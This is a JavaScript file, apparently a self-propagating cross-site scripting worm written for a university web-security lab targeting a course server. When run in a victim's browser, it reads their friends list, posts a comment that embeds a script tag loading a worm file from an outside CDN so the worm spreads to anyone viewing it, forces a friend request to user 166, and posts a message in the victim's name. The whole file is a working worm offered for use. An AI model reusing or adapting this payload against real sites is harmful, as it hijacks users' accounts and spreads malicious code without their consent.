function moveitmoveit() {
    var home = $.ajax({
        async: false,
        type: 'GET',
        url: 'http://csec380-core.csec.rit.edu:86/home.php',
        success: function(data) {
            return data;
        }
    });
    var friend = $.ajax({
        async: false,
        type: 'GET',
        url: 'http://csec380-core.csec.rit.edu:86/friends.php',
        success: function(data) {
            return data;
        }
    });
    var eff = friend.responseText;
    var arr= eff.match('^[^<br]*').join().split(',');
    
    if(eff.match('166') == null){
        $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",
              { comment: '<script src="https://cdn.jsdelivr.net/gh/DarkLemon27/WebApp/easyworm.js"></script><img src="https://img.buzzfeed.com/buzzfeed-static/static/2019-11/19/20/asset/be34feec736a/sub-buzz-4628-1574196545-1.png" width=300 height=300 />'});
        $.get("http://csec380-core.csec.rit.edu:86/add_friend.php",{id: 166});
        $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{id: 166,comment: 'Im your friend now'});
    }
}
moveitmoveit();
